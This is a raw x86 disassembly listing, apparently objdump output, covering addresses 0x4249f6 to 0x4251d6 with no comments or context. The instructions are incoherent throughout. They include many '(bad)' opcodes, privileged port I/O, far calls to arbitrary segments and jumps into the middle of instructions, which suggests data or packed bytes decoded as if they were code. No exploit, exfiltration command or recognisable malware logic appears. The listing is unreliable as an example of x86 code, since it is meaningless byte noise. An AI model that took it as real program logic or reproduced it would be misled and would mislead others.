  4249f6:	sar    DWORD PTR [eax+0x47],0xd9
  4249fa:	pop    ecx
  4249fb:	push   eax
  4249fc:	shl    dl,0x7c
  4249ff:	mov    ebp,0x620965e5
  424a04:	jmp    0x424a73
  424a06:	scas   eax,DWORD PTR es:[edi]
  424a07:	fcom   DWORD PTR [ecx-0xccd7444]
  424a0d:	shl    BYTE PTR [eax+ecx*8],1
  424a10:	sub    al,0xd6
  424a12:	mov    ecx,0x385d53fc
  424a17:	popf   
  424a18:	jmp    0x424a6a
  424a1a:	icebp  
  424a1b:	sbb    BYTE PTR [edi+0x6d],dh
  424a1e:	sub    DWORD PTR [eax-0x51],edx
  424a21:	inc    ebp
  424a22:	pop    ebp
  424a23:	enter  0xa2,0xd9
  424a27:	push   edx
  424a28:	add    al,0x38
  424a2a:	xchg   edx,eax
  424a2b:	fucomp st(3)
  424a2d:	arpl   WORD PTR [eax+eax*1+0x79],ax
  424a31:	mov    ds:0xdfa32110,al
  424a36:	cmp    bl,BYTE PTR [ecx+0x3fe518c4]
  424a3c:	lds    edx,FWORD PTR [ebx]
  424a3e:	std    
  424a3f:	mov    eax,ds:0xbcc08516
  424a44:	adc    DWORD PTR [ebx+edx*8],esi
  424a47:	fstp   QWORD PTR [edx]
  424a49:	mov    eax,ds:0x5fb3a401
  424a4e:	sbb    eax,0x7b17511a
  424a53:	sti    
  424a54:	jmp    0x424a7c
  424a56:	out    dx,eax
  424a57:	loop   0x424ac1
  424a59:	cdq    
  424a5a:	add    edi,esp
  424a5c:	jno    0x424a3d
  424a5e:	outs   dx,DWORD PTR ds:[esi]
  424a5f:	repz mov edi,0xd89f83dc
  424a65:	pop    ebx
  424a66:	std    
  424a67:	pop    esp
  424a68:	jbe    0x424a3a
  424a6a:	mov    esp,0x38b4cd4a
  424a6f:	mov    esp,0x4fbff0c2
  424a74:	jo     0x424aee
  424a76:	sbb    eax,0x41206655
  424a7b:	sbb    ch,bl
  424a7d:	xor    DWORD PTR [ecx],0xd711f337
  424a83:	(bad)  
  424a84:	fistp  QWORD PTR fs:[esi-0x3fc4d3f0]
  424a8b:	jge    0x424af0
  424a8d:	test   eax,0xa2ec58ac
  424a92:	jmp    0x424ae9
  424a94:	jl     0x424ae6
  424a96:	and    bh,BYTE PTR [edx]
  424a98:	sbb    edx,esp
  424a9a:	add    edi,DWORD PTR [ebp+0x132fbfbb]
  424aa0:	retf   0x7d14
  424aa3:	push   0xffffff94
  424aa5:	mov    ecx,0xad7b56b1
  424aaa:	cld    
  424aab:	fisttp QWORD PTR [ebx]
  424aad:	mov    ah,0x59
  424aaf:	xchg   ebp,eax
  424ab0:	dec    edi
  424ab1:	cmp    BYTE PTR [ebp-0x39],cl
  424ab4:	ja     0x424a4f
  424ab6:	sbb    BYTE PTR ds:0x9bc5f2d,0x22
  424abd:	fwait
  424abe:	cld    
  424abf:	data16 jae 0x424aec
  424ac2:	fnsave [ecx+eiz*1-0x33]
  424ac6:	jnp    0x424a90
  424ac8:	out    dx,al
  424ac9:	std    
  424aca:	mov    ch,0x8d
  424acc:	xor    eax,0xeb8bf7fc
  424ad1:	leave  
  424ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ad3:	sub    eax,0xc9461196
  424ad8:	call   0x6ba8:0xefb13df
  424adf:	loope  0x424b0a
  424ae1:	mov    ecx,0x5e2a32d
  424ae6:	push   ebp
  424ae7:	dec    eax
  424ae8:	adc    al,0xa2
  424aea:	mov    ?,WORD PTR [esi-0x3743030f]
  424af0:	pop    ecx
  424af1:	fnsave [ebx+0x69]
  424af4:	in     al,dx
  424af5:	cmp    ecx,esi
  424af7:	test   eax,0xa0a4e8eb
  424afc:	adc    eax,0xb24e973e
  424b01:	fild   WORD PTR [eax+0x57]
  424b04:	mov    edx,DWORD PTR [edx]
  424b06:	add    DWORD PTR [eax+esi*8+0x6d],ecx
  424b0a:	repz cmp BYTE PTR [edx+0x0],0xf4
  424b0f:	inc    edi
  424b10:	jl     0x424aa7
  424b12:	jg     0x424adf
  424b14:	sbb    bh,0xca
  424b17:	in     eax,dx
  424b18:	pop    esi
  424b19:	dec    ecx
  424b1a:	js     0x424b33
  424b1c:	fcom   DWORD PTR [ecx+0x1f1c79fc]
  424b22:	sbb    al,0x57
  424b24:	in     eax,dx
  424b25:	pop    ebx
  424b26:	test   BYTE PTR [esp+ebx*8-0x21],bl
  424b2a:	mov    bl,0x53
  424b2c:	and    eax,DWORD PTR [esi]
  424b2e:	jbe    0x424b5d
  424b30:	imul   ebx,DWORD PTR [edx],0xfffffffd
  424b33:	int    0xb5
  424b35:	mov    dl,0x4c
  424b37:	loop   0x424b3c
  424b39:	adc    esp,ecx
  424b3b:	sahf   
  424b3c:	ins    BYTE PTR es:[edi],dx
  424b3d:	push   ecx
  424b3e:	pop    edx
  424b3f:	enter  0xf32e,0x9f
  424b43:	div    BYTE PTR [eax+0x46]
  424b46:	jmp    esi
  424b48:	out    0xb4,al
  424b4a:	gs (bad) 
  424b4c:	adc    DWORD PTR [edi+0x340ee65c],esi
  424b52:	leave  
  424b53:	enter  0x8254,0xe9
  424b57:	pop    esp
  424b58:	or     DWORD PTR [edi+0x2cfdb50],0x5eb752f
  424b62:	imul   eax,DWORD PTR [esi+0xd],0xffffffaa
  424b66:	or     al,0xf8
  424b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b6a:	mov    BYTE PTR [ecx+eax*8-0x8],dh
  424b6e:	and    al,0xb7
  424b70:	pop    es
  424b71:	outs   dx,DWORD PTR ds:[esi]
  424b72:	stc    
  424b73:	add    edi,DWORD PTR [edi+0x4e018bbd]
  424b79:	(bad)  
  424b7b:	pusha  
  424b7c:	or     DWORD PTR [edi],ebp
  424b7e:	mov    ebp,0xe554ebf5
  424b83:	imul   esi,ecx,0xffffffa8
  424b86:	fmul   st(7),st
  424b88:	(bad)  
  424b89:	loopne 0x424b74
  424b8b:	sub    eax,0x17d99a7f
  424b90:	or     al,0xe9
  424b92:	sub    eax,0xfd469ca6
  424b97:	mov    DWORD PTR [ebx+0x46e2dfed],ecx
  424b9d:	pop    edi
  424b9e:	sub    eax,ecx
  424ba0:	(bad)  
  424ba1:	addr16 mov dl,0xe9
  424ba4:	in     al,dx
  424ba5:	jbe    0x424b2e
  424ba7:	fucomi st,st(3)
  424ba9:	fs sub dl,ch
  424bac:	xchg   esp,eax
  424bad:	push   ss
  424bae:	scas   al,BYTE PTR es:[edi]
  424baf:	je     0x424b5f
  424bb1:	fistp  QWORD PTR [edx-0x70]
  424bb4:	std    
  424bb5:	in     al,dx
  424bb6:	ret    
  424bb7:	and    DWORD PTR [eax],esp
  424bb9:	mov    es,WORD PTR [ecx-0x7]
  424bbc:	inc    ebp
  424bbd:	fist   WORD PTR [ecx]
  424bbf:	or     al,0xdf
  424bc1:	or     bh,BYTE PTR [esi+0x27]
  424bc4:	ins    DWORD PTR es:[edi],dx
  424bc5:	fist   WORD PTR [edx+0x18]
  424bc8:	inc    esi
  424bc9:	cmp    DWORD PTR [edi],ebp
  424bcb:	cmp    al,0xec
  424bcd:	jmp    0x424bcb
  424bcf:	leave  
  424bd0:	lods   eax,DWORD PTR ds:[esi]
  424bd1:	ss jns 0x424b92
  424bd4:	mov    ch,0x73
  424bd6:	out    0xca,eax
  424bd8:	inc    esp
  424bd9:	(bad)  
  424bda:	into   
  424bdb:	push   eax
  424bdc:	cli    
  424bdd:	test   BYTE PTR [ebp-0x27f5afd],cl
  424be3:	add    DWORD PTR [esi+0x5c],ebx
  424be6:	js     0x424c32
  424be8:	test   DWORD PTR ds:0xdf062260,ecx
  424bee:	push   0x963e8cd6
  424bf3:	and    ecx,DWORD PTR ds:[ecx-0x3]
  424bf7:	test   ecx,eax
  424bf9:	mov    ebx,0x2084d3f0
  424bfe:	adc    edi,DWORD PTR [edx+ebp*8-0x7a3753fd]
  424c05:	adc    al,0x99
  424c07:	sub    ch,BYTE PTR [esi-0x6]
  424c0a:	cld    
  424c0b:	cmp    al,BYTE PTR [ebx-0x6b7d7dc2]
  424c11:	and    DWORD PTR [edx-0x3f5b8138],edi
  424c17:	sbb    DWORD PTR [ebx],edi
  424c19:	(bad)
  424c1c:	in     al,dx
  424c1d:	and    ecx,eax
  424c1f:	mov    edi,0xc639e695
  424c24:	daa    
  424c25:	ja     0x424bd8
  424c27:	enter  0xfb69,0xa1
  424c2b:	(bad)  
  424c2c:	jge    0x424be3
  424c2e:	mov    ecx,0x9d4cbf59
  424c33:	iret   
  424c34:	ret    0x1262
  424c37:	test   al,0xc7
  424c39:	pushf  
  424c3a:	mul    eax
  424c3c:	sbb    edi,0xffffffa3
  424c3f:	xor    cl,BYTE PTR ds:0x3d8116f6
  424c45:	jnp    0x424c44
  424c47:	push   cs
  424c48:	fs hlt 
  424c4a:	das    
  424c4b:	pop    esp
  424c4c:	out    0x43,eax
  424c4e:	jae    0x424be6
  424c50:	or     bl,bh
  424c52:	xor    ch,BYTE PTR [eax+0x30a4b0e6]
  424c58:	icebp  
  424c59:	es cdq 
  424c5b:	aas    
  424c5c:	repnz xlat BYTE PTR ds:[ebx]
  424c5e:	push   edi
  424c5f:	popa   
  424c60:	outs   dx,DWORD PTR ds:[esi]
  424c61:	pop    edi
  424c62:	clc    
  424c63:	mov    ds:0xc83e185b,al
  424c68:	mov    ds:0x4f0bd722,eax
  424c6d:	lea    edi,[ebx]
  424c6f:	push   0xffffffe1
  424c71:	add    bl,BYTE PTR [edi-0x2795b9b8]
  424c77:	fst    QWORD PTR [ecx]
  424c79:	into   
  424c7a:	jle    0x424cbc
  424c7c:	pop    es
  424c7d:	fist   WORD PTR [eax]
  424c7f:	mov    cl,0x81
  424c81:	(bad)  
  424c82:	jo     0x424c32
  424c84:	push   edx
  424c85:	sub    al,0xfd
  424c87:	pop    ss
  424c88:	(bad)  
  424c89:	or     DWORD PTR [edi+0x5b47dad9],ebx
  424c8f:	nop
  424c90:	cld    
  424c91:	fsubr  QWORD PTR [ebx]
  424c93:	popf   
  424c94:	test   edi,ebx
  424c96:	jb     0x424c55
  424c98:	mov    bh,0x67
  424c9a:	hlt    
  424c9b:	dec    ecx
  424c9c:	loop   0x424ca7
  424c9e:	std    
  424c9f:	or     edx,DWORD PTR [edx]
  424ca1:	inc    eax
  424ca2:	repz idiv BYTE PTR [edx+ecx*8-0x61a378d]
  424caa:	int3   
  424cab:	xor    DWORD PTR [ebx+0x13e8beda],0xfffffffa
  424cb2:	cld    
  424cb3:	add    ah,BYTE PTR [ebx+ebx*4]
  424cb6:	ins    DWORD PTR es:[edi],dx
  424cb7:	fcmovu st,st(7)
  424cb9:	push   ss
  424cba:	ror    cl,0xb6
  424cbd:	out    dx,al
  424cbe:	sub    eax,0x7bc415a4
  424cc3:	jmp    0x62f20c3f
  424cc8:	jmp    0x424c74
  424cca:	cmp    ebp,esi
  424ccc:	fistp  QWORD PTR [esi-0x6]
  424ccf:	and    al,0x3e
  424cd1:	fistp  WORD PTR [edi]
  424cd3:	out    dx,eax
  424cd4:	or     ebx,DWORD PTR [ebx+edx*4]
  424cd7:	aaa    
  424cd8:	(bad)  [edi]
  424cda:	cld    
  424cdb:	mov    ah,BYTE PTR [edi]
  424cdd:	mov    edi,DWORD PTR [edx]
  424cdf:	jl     0x424c9d
  424ce1:	dec    eax
  424ce2:	push   cs
  424ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ce4:	xor    edx,DWORD PTR [edi+0x76]
  424ce7:	iret   
  424ce8:	dec    ecx
  424ce9:	xor    eax,0xa36b582f
  424cee:	mov    dl,0xa1
  424cf0:	arpl   WORD PTR [edx],bp
  424cf2:	inc    BYTE PTR [edi+0x78]
  424cf5:	shl    edx,cl
  424cf7:	xchg   BYTE PTR [eax+0x30f3b0fe],ah
  424cfd:	dec    edi
  424cfe:	scas   eax,DWORD PTR es:[edi]
  424cff:	enter  0xc641,0xed
  424d03:	loopne 0x424cdf
  424d05:	xchg   BYTE PTR [esi-0x5b],dl
  424d08:	jmp    0x424d11
  424d0a:	push   ds
  424d0b:	call   0x21c738b3
  424d10:	sbb    eax,0x101886ea
  424d15:	pop    ds
  424d16:	sub    eax,0x335eefa1
  424d1b:	lahf   
  424d1c:	fld    QWORD PTR [esi-0xbbbb509]
  424d22:	add    DWORD PTR [esi+0x2c2f8f1b],0x194904e3
  424d2c:	imul   edi,DWORD PTR [esi-0x4d],0x10
  424d30:	outs   dx,DWORD PTR ds:[esi]
  424d31:	mov    esi,0x67970914
  424d36:	std    
  424d37:	sahf   
  424d38:	and    ecx,DWORD PTR [edx+0x4f4edc91]
  424d3e:	popf   
  424d3f:	enter  0xe740,0x59
  424d43:	dec    esp
  424d44:	inc    ebp
  424d45:	cmp    al,0x82
  424d47:	pop    esp
  424d48:	jmp    0x424d0b
  424d4a:	or     BYTE PTR [edi],ah
  424d4c:	imul   edx,DWORD PTR [esi-0x2624ad50],0xfca1675e
  424d56:	mov    esp,0x6e1351b8
  424d5b:	ins    DWORD PTR es:[edi],dx
  424d5c:	loop   0x424d17
  424d5e:	int    0x5c
  424d60:	sbb    eax,0x52806edd
  424d65:	sahf   
  424d66:	pop    edx
  424d67:	test   al,0x92
  424d69:	push   ss
  424d6a:	(bad)  
  424d6b:	enter  0x3586,0x48
  424d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d70:	sbb    BYTE PTR [eax],0x4e
  424d73:	pop    ebp
  424d74:	in     al,dx
  424d75:	and    al,dh
  424d77:	and    eax,0x585f750c
  424d7c:	sbb    ebx,DWORD PTR [ecx]
  424d7e:	stos   BYTE PTR es:[edi],al
  424d7f:	enter  0x1081,0x29
  424d83:	jl     0x424d05
  424d85:	pop    edx
  424d86:	mov    bh,0xf3
  424d88:	jmp    0x424d5e
  424d8a:	fbstp  TBYTE PTR ds:0xf5be3392
  424d90:	mov    al,ds:0x8a389df
  424d95:	cdq    
  424d96:	(bad)  [ebp-0x5202c61a]
  424d9c:	fwait
  424d9d:	inc    eax
  424d9e:	cmp    al,0x5a
  424da0:	push   ds
  424da1:	xchg   BYTE PTR [eax-0x38],bh
  424da4:	mov    BYTE PTR [ebx+0x6681d6ca],al
  424daa:	and    BYTE PTR ds:0x97514beb,al
  424db0:	or     DWORD PTR [edx+ebp*1],esp
  424db3:	dec    edx
  424db4:	cmp    al,0xdf
  424db6:	jno    0x424d38
  424db8:	fmul   DWORD PTR [eax+0x59]
  424dbb:	xchg   ebx,eax
  424dbc:	pop    ebx
  424dbd:	js     0x424d5e
  424dbf:	das    
  424dc0:	loope  0x424d78
  424dc2:	mov    edi,0xfc9d5437
  424dc7:	mov    ds:0x249075e3,eax
  424dcc:	mov    ah,0xdf
  424dce:	repz rcl BYTE PTR ds:[esi+eax*8-0x1354a3f],1
  424dd7:	and    al,0xca
  424dd9:	mov    eax,0x1f6322e3
  424dde:	or     ch,BYTE PTR [ebp+0x730e01bc]
  424de4:	loop   0x424dc5
  424de6:	xor    DWORD PTR [edi-0x3a],esi
  424de9:	cwde   
  424dea:	xor    eax,0x67c5ebe6
  424def:	rol    DWORD PTR [ecx-0x6b],0xe6
  424df3:	fnstcw WORD PTR [edi+ebx*8+0x2c]
  424df7:	loope  0x424e1e
  424df9:	les    ebx,FWORD PTR [ebp-0x2c7b5df]
  424dff:	mov    al,ds:0x8d38ae06
  424e04:	dec    edi
  424e05:	xchg   ecx,eax
  424e06:	fcom   QWORD PTR [eax+eiz*8+0x50f5cdc]
  424e0d:	pusha  
  424e0e:	dec    edx
  424e0f:	int3   
  424e10:	imul   edi,DWORD PTR [edi],0xffffffa1
  424e13:	dec    eax
  424e14:	jmp    0x424e86
  424e16:	mov    DWORD PTR [ecx],edx
  424e18:	jmp    0x6a342654
  424e1d:	fistp  WORD PTR [ecx+esi*8+0x7a]
  424e21:	sub    eax,0xc133bfe2
  424e26:	std    
  424e27:	in     eax,dx
  424e28:	adc    eax,0xa36b3a5b
  424e2d:	test   BYTE PTR [ebp+0x4bdf6af9],dh
  424e33:	das    
  424e34:	push   ebx
  424e35:	jmp    0x424e5e
  424e37:	sub    al,0xac
  424e39:	or     eax,0xd09beefd
  424e3e:	push   ds
  424e3f:	push   ds
  424e40:	cwde   
  424e41:	or     BYTE PTR [eax-0x69],bh
  424e44:	retf   
  424e45:	loopne 0x424dd3
  424e47:	xchg   edx,eax
  424e48:	mov    al,0x82
  424e4a:	stos   BYTE PTR es:[edi],al
  424e4b:	clc    
  424e4c:	pop    es
  424e4d:	mov    eax,0xe3a37ea6
  424e52:	loope  0x424e26
  424e54:	aad    0x5f
  424e56:	pop    es
  424e57:	mov    bh,0x3f
  424e59:	ss inc esp
  424e5b:	sbb    al,dl
  424e5d:	rcl    dl,1
  424e5f:	enter  0xd40,0x5b
  424e63:	jecxz  0x424df6
  424e65:	jb     0x424e67
  424e67:	hlt    
  424e68:	push   edi
  424e69:	dec    ebx
  424e6a:	std    
  424e6b:	frstor [edx]
  424e6d:	cld    
  424e6e:	je     0x424e06
  424e70:	jecxz  0x424e85
  424e72:	mov    edi,0x4df4bbc8
  424e77:	mov    cl,0x5b
  424e79:	push   esp
  424e7a:	xchg   esp,eax
  424e7b:	and    BYTE PTR [ebp-0x14b8d236],bl
  424e81:	adc    DWORD PTR [edi],edi
  424e83:	sar    al,1
  424e85:	mov    ecx,0x87ea59b0
  424e8a:	addr16 enter 0x3261,0x57
  424e8f:	push   ds
  424e90:	addr16 push 0xffffff92
  424e93:	sti    
  424e94:	adc    DWORD PTR [ebx-0x3],ebp
  424e97:	sbb    BYTE PTR [ecx],al
  424e99:	adc    esp,0x1a
  424e9c:	jno    0x424e48
  424e9e:	test   al,cl
  424ea0:	adc    ecx,DWORD PTR [ebx+0x16fdf4af]
  424ea6:	mov    ebx,0x191cafb3
  424eab:	lds    edi,FWORD PTR [esi]
  424ead:	popf   
  424eae:	adc    ecx,DWORD PTR [esi+0x6c]
  424eb1:	cld    
  424eb2:	(bad)  
  424eb4:	or     eax,0xc9db961f
  424eb9:	fild   WORD PTR [eax+0x26]
  424ebc:	xchg   ecx,eax
  424ebd:	xchg   esi,eax
  424ebe:	gs push eax
  424ec0:	shl    dh,cl
  424ec2:	cld    
  424ec3:	lds    esi,FWORD PTR [eax-0xbf0a0d8]
  424ec9:	div    DWORD PTR [edx]
  424ecb:	in     al,0x66
  424ecd:	rcl    DWORD PTR [ebx-0x38],0xc9
  424ed1:	aam    0x71
  424ed3:	fwait
  424ed4:	jp     0x424ec8
  424ed6:	cld    
  424ed7:	push   esp
  424ed8:	mov    ebx,0xdc8549d7
  424edd:	xchg   edx,edi
  424edf:	enter  0x2e3a,0xaa
  424ee3:	sbb    cl,BYTE PTR [edi+0x48]
  424ee6:	in     eax,0xf
  424ee8:	(bad)  
  424ee9:	sbb    esi,ebx
  424eeb:	push   esp
  424eec:	push   es
  424eed:	pop    edx
  424eee:	mov    ds:0x1f152c88,eax
  424ef3:	cmp    DWORD PTR [edi-0x15],ebp
  424ef6:	pusha  
  424ef7:	js     0x424f72
  424ef9:	fmul   st,st(1)
  424efb:	shr    ebx,1
  424efd:	out    dx,al
  424efe:	or     al,0xcf
  424f00:	push   edx
  424f01:	addr16 and dh,bl
  424f04:	jmp    0x424f1e
  424f06:	cld    
  424f07:	mov    edx,0x6954eb99
  424f0c:	mov    bh,0xce
  424f0e:	sbb    eax,0xb8354dc8
  424f13:	out    0x91,eax
  424f15:	dec    ecx
  424f16:	sbb    eax,0x8bb2f2ed
  424f1b:	add    BYTE PTR [ecx-0x21],0xaa
  424f1f:	mov    ecx,DWORD PTR [ecx+0x2b4b0b7]
  424f25:	dec    esp
  424f26:	fcomp  QWORD PTR [ecx-0x1a]
  424f29:	cmp    ah,BYTE PTR [ecx+0x3]
  424f2c:	inc    ebx
  424f2d:	das    
  424f2e:	int    0x98
  424f30:	xor    edi,edi
  424f32:	rep stos DWORD PTR es:[edi],eax
  424f34:	jg     0x424f41
  424f36:	imul   ebp,eax,0xa150866d
  424f3c:	adc    al,0xdf
  424f3e:	mov    cl,0x6e
  424f40:	es out 0x92,al
  424f43:	js     0x424fb4
  424f45:	paddw  mm6,mm4
  424f48:	jne    0x424f13
  424f4a:	clc    
  424f4b:	mul    dl
  424f4d:	ret    0xc84e
  424f50:	pop    esi
  424f51:	push   edx
  424f52:	pop    ecx
  424f53:	test   DWORD PTR [ebp-0x157fd843],esp
  424f59:	fld    QWORD PTR [esi-0x3]
  424f5c:	iret   
  424f5d:	xor    BYTE PTR [ebx+0x50],0x24
  424f61:	out    0x38,eax
  424f63:	enter  0xdc27,0xac
  424f67:	mov    esi,0x7f44b7a
  424f6c:	jmp    0x424fb8
  424f6e:	scas   al,BYTE PTR es:[edi]
  424f6f:	std    
  424f70:	fsubr  QWORD PTR [ecx-0x20eb52f5]
  424f76:	loopne 0x424f1a
  424f78:	xchg   edi,eax
  424f79:	icebp  
  424f7a:	fisttp QWORD PTR [eax]
  424f7c:	scas   al,BYTE PTR es:[edi]
  424f7d:	into   
  424f7e:	repnz test BYTE PTR [edi],0xf9
  424f82:	pop    edx
  424f83:	(bad)  
  424f84:	mov    ch,0x60
  424f86:	lods   al,BYTE PTR ds:[esi]
  424f87:	mov    al,BYTE PTR [esi]
  424f89:	out    dx,eax
  424f8a:	(bad)  
  424f8b:	and    BYTE PTR [edi-0x62],al
  424f8e:	adc    ebx,ebx
  424f90:	sbb    eax,DWORD PTR ds:0xdff72e22
  424f96:	sahf   
  424f97:	xlat   BYTE PTR ds:[ebx]
  424f98:	into   
  424f99:	fmul   DWORD PTR [edx-0x2753c0b]
  424f9f:	outs   dx,DWORD PTR ds:[esi]
  424fa0:	call   0x918c:0x5d8191be
  424fa7:	mov    al,ds:0x9f6adfdd
  424fac:	rol    ch,cl
  424fae:	jb     0x424fb6
  424fb0:	adc    DWORD PTR [edx],esp
  424fb2:	std    
  424fb3:	adc    al,0x3c
  424fb5:	test   BYTE PTR [eax-0x2d66cc66],0xc8
  424fbc:	sub    edi,eax
  424fbe:	test   DWORD PTR [esp+ebx*4],esp
  424fc1:	dec    ecx
  424fc2:	jnp    0x424ff4
  424fc4:	mov    bl,0x86
  424fc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fc7:	xchg   edi,eax
  424fc8:	jmp    0x424f8e
  424fca:	(bad)
  424fcf:	adc    eax,DWORD PTR [ecx]
  424fd1:	shl    DWORD PTR [ebx-0x70232aa8],cl
  424fd7:	add    al,0xa9
  424fd9:	dec    ebp
  424fda:	shr    DWORD PTR [esi],1
  424fdc:	jae    0x424fee
  424fde:	(bad)  
  424fdf:	dec    ebp
  424fe0:	jmp    0x424f97
  424fe2:	push   ds
  424fe3:	mov    WORD PTR [edx+0x184b7e8c],?
  424fe9:	fmul   QWORD PTR [ebp+0x6d]
  424fec:	fsubr  QWORD PTR [ebp-0x187c244c]
  424ff2:	je     0x425043
  424ff4:	jmp    0xd264f840
  424ff9:	retf   0x287f
  424ffc:	cmp    dl,BYTE PTR [ebp+0x69]
  424fff:	enter  0xb4e1,0xc5
  425003:	cmp    ebx,DWORD PTR [eax-0x1502fd7e]
  425009:	xor    eax,0xab387ea4
  42500e:	stos   DWORD PTR es:[edi],eax
  42500f:	sub    BYTE PTR [ecx],bh
  425011:	enter  0xc7fb,0xdb
  425015:	sbb    BYTE PTR [esi+0x4e],dl
  425018:	inc    edi
  425019:	lds    ebx,FWORD PTR [edx+0x44d9cf61]
  42501f:	sub    ebx,edx
  425021:	cmp    ch,0x3f
  425024:	jg     0x42504a
  425026:	cdq    
  425027:	xchg   DWORD PTR ds:0x33c7f607,ecx
  42502d:	out    0x2c,al
  42502f:	mov    ds:0xb1d94cfc,eax
  425034:	or     DWORD PTR [esi],ebp
  425036:	std    
  425037:	stos   BYTE PTR es:[edi],al
  425038:	mov    edi,0x9011083e
  42503d:	pusha  
  42503e:	xchg   ecx,eax
  42503f:	enter  0x194b,0xe6
  425043:	ror    DWORD PTR [edx],cl
  425045:	or     BYTE PTR [ebp-0x33],ah
  425048:	jmp    0x425094
  42504a:	cmp    eax,0xd5efb3fb
  42504f:	pop    eax
  425050:	push   0x8e2302df
  425055:	pop    edx
  425056:	out    dx,al
  425057:	and    BYTE PTR [ebp+0x3a],0x97
  42505b:	into   
  42505c:	jmp    0x425097
  42505e:	xor    al,0x18
  425060:	xor    ebx,0xdfd60b16
  425066:	and    BYTE PTR ds:0x57e4315a,dl
  42506c:	cdq    
  42506d:	inc    esi
  42506e:	std    
  42506f:	sub    al,0xce
  425071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425072:	cmp    DWORD PTR [esi-0x37f4caf9],0xe68ee1a2
  42507c:	adc    al,BYTE PTR [eax]
  42507e:	stc    
  42507f:	sub    dh,ah
  425081:	adc    ebx,DWORD PTR [edx-0x20]
  425084:	(bad)  
  425086:	in     al,dx
  425087:	fadd   QWORD PTR [edi+0x2517fc94]
  42508d:	fst    QWORD PTR [edi-0x23205442]
  425093:	and    BYTE PTR [eax-0x57],ah
  425096:	and    ebx,edi
  425098:	lock jnp 0x425038
  42509b:	(bad)  
  42509c:	jmp    0x4250b0
  42509e:	lods   al,BYTE PTR ds:[esi]
  42509f:	pop    es
  4250a0:	jne    0x4250ad
  4250a2:	mov    WORD PTR [ecx-0x23],ds
  4250a5:	fbstp  TBYTE PTR [eax]
  4250a7:	xor    DWORD PTR [edi],ebp
  4250a9:	dec    ecx
  4250aa:	je     0x42506c
  4250ac:	out    0x2e,eax
  4250ae:	std    
  4250af:	int3   
  4250b0:	or     al,0xf0
  4250b2:	loope  0x425062
  4250b4:	imul   ecx,DWORD PTR [edi+0x4c8fc833],0x8998dbe7
  4250be:	and    bh,BYTE PTR [edx+0xfc855eb]
  4250c4:	push   ebp
  4250c5:	push   0xffffffaf
  4250c7:	xchg   edx,eax
  4250c8:	test   edi,ebx
  4250ca:	aaa    
  4250cb:	push   edi
  4250cc:	in     al,0x8b
  4250ce:	fsub   QWORD PTR [edx+0x6601a0c7]
  4250d4:	retf   0xbd8e
  4250d7:	pop    es
  4250d8:	mov    esi,0x1820ee3b
  4250dd:	ffreep st(3)
  4250df:	lahf   
  4250e0:	aad    0x62
  4250e2:	jecxz  0x425067
  4250e4:	cli    
  4250e5:	out    0xd4,eax
  4250e7:	dec    ecx
  4250e8:	cmp    cl,BYTE PTR [edx+0x561bb6e8]
  4250ee:	mov    cl,0xb5
  4250f0:	cmp    ebx,DWORD PTR [eax+0x14]
  4250f3:	sub    ebx,DWORD PTR [edx]
  4250f5:	clc    
  4250f6:	sti    
  4250f7:	test   DWORD PTR [esi-0x5e37f264],0x89cd30e8
  425101:	dec    eax
  425102:	ins    BYTE PTR es:[edi],dx
  425103:	icebp  
  425104:	in     eax,dx
  425105:	xor    bl,ah
  425107:	cs call 0x49c8:0x15d2349f
  42510f:	enter  0x986,0x5f
  425113:	daa    
  425114:	xchg   edi,eax
  425115:	and    al,0x26
  425117:	pop    esi
  425118:	jmp    0x4250ce
  42511a:	pusha  
  42511b:	xchg   edi,eax
  42511c:	inc    esi
  42511d:	stos   DWORD PTR es:[edi],eax
  42511e:	cmp    eax,0xb7fbd2ed
  425123:	mov    dh,0x55
  425125:	fcomip st,st(5)
  425127:	cld    
  425128:	xor    DWORD PTR [esp+esi*4+0x9291b44],ecx
  42512f:	daa    
  425130:	inc    edi
  425131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425132:	pop    ecx
  425133:	enter  0x1d76,0x22
  425137:	mov    esi,0xc870563c
  42513c:	lahf   
  42513d:	into   
  42513e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42513f:	das    
  425140:	and    dl,BYTE PTR ds:0x92f28885
  425146:	test   ah,bl
  425148:	and    al,0x5d
  42514a:	sbb    bh,BYTE PTR [edi+0x58ce5fec]
  425150:	sub    ch,BYTE PTR [ebp+0x74]
  425153:	retf   0x62b7
  425156:	in     al,0xeb
  425158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425159:	dec    edi
  42515a:	mov    ebp,0xfd2c2762
  42515f:	sbb    WORD PTR [ebp-0x64006da6],cx
  425166:	push   ebp
  425167:	enter  0x536f,0x49
  42516b:	pmaxub mm3,QWORD PTR [edx+0x40eb66b8]
  425172:	jnp    0x4251cc
  425174:	pusha  
  425175:	mov    esp,0xdf95dffd
  42517a:	push   edx
  42517b:	in     al,dx
  42517c:	pop    esp
  42517d:	sahf   
  42517e:	inc    esp
  42517f:	hlt    
  425180:	pop    esi
  425181:	fild   DWORD PTR [eax-0x68]
  425184:	add    al,ah
  425186:	ja     0x4251d9
  425188:	popf   
  425189:	xor    bl,ch
  42518b:	cdq    
  42518c:	repz (bad) 
  42518f:	in     al,0x98
  425191:	ds mov edi,0x1003b6a
  425197:	stos   DWORD PTR es:[edi],eax
  425198:	scas   eax,DWORD PTR es:[edi]
  425199:	lea    edi,ds:0x47690001
  42519f:	aad    0x99
  4251a1:	(bad)  
  4251a3:	fmul   QWORD PTR [eax-0x5d]
  4251a6:	loopne 0x425142
  4251a8:	retf   0xfca7
  4251ab:	mov    edi,0x76f4b702
  4251b0:	sbb    BYTE PTR [ebx],dh
  4251b2:	xor    DWORD PTR [edi-0x417320bc],edx
  4251b8:	push   0x2b3be256
  4251bd:	and    bh,ch
  4251bf:	mov    dl,0x54
  4251c1:	jb     0x425197
  4251c3:	ficom  DWORD PTR ds:0x99c872d6
  4251c9:	and    al,0xbf
  4251cb:	xchg   ecx,eax
  4251cc:	cld    
  4251cd:	cdq    
  4251ce:	cmp    DWORD PTR [edx],ebp
  4251d0:	jmp    0x425200
  4251d2:	js     0x42520d
  4251d4:	repnz push eax
  4251d6:	fdivr  st(2),st
